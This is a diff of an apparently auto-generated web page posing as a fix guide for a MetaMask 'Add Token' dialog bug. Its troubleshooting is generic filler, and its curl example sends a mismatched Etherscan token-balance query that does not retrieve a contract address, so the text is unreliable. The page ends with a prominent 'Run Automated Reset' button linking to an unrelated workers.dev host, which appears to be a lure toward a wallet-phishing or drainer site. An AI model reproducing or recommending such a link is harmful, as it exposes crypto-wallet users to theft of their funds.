@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A D – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,37 +39,38 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</h1>
+<h1>Metamask Extension Bug Assets Confirming The Add Token From A D</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue where the "Add Token" dialog from a dapp keeps looping back to the "Add token" page in the Metamask extension, instead of confirming the token addition.</li>
+<li>Users experience a persistent "Add token" page when attempting to confirm the addition of a token from a decentralized application (dapp) using the Metamask extension, with the dialog box failing to proceed or close.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the dapp and the Metamask extension, causing the token confirmation process to fail and loop back to the "Add token" page.</li>
+<li>The error occurs due to a bug within the Metamask extension's handling of token addition requests from dapps, potentially stemming from miscommunication between the extension and the Ethereum network or an issue with the token's smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Check the token contract address for any typos or incorrect formatting.</li>
-<li>Verify that the dapp is using the latest version of the Metamask API.</li>
-<li>Use the following JSON configuration to manually add the token:</li>
+<li>Attempt to manually add the token by retrieving its contract address and token symbol:</li>
+<li>Go to the dapp's website and find the token's contract address</li>
+<li>Open Metamask and navigate to the "Assets" tab</li>
+<li>Click "Add Token" and enter the contract address</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token_contract_address...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token_symbol...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">...</span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="err">_decimals...</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># Example of retrieving token contract address</span>
+curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.etherscan.io/api<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;module&quot;:&quot;account&quot;,&quot;action&quot;:&quot;tokenbalance&quot;,&quot;address&quot;:&quot;0x...&quot;,&quot;tag&quot;:&quot;latest&quot;,&quot;id&quot;:&quot;0&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external Ethereum console for more advanced troubleshooting. </p>
+<p>Consider utilizing an external console for more complex debugging tasks.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Dapp integrated with Metamask API</li>
-<li>Token contract address and details available</li>
+<li>Ethereum wallet set up with sufficient balance</li>
+<li>Dapp website with token addition functionality accessible</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
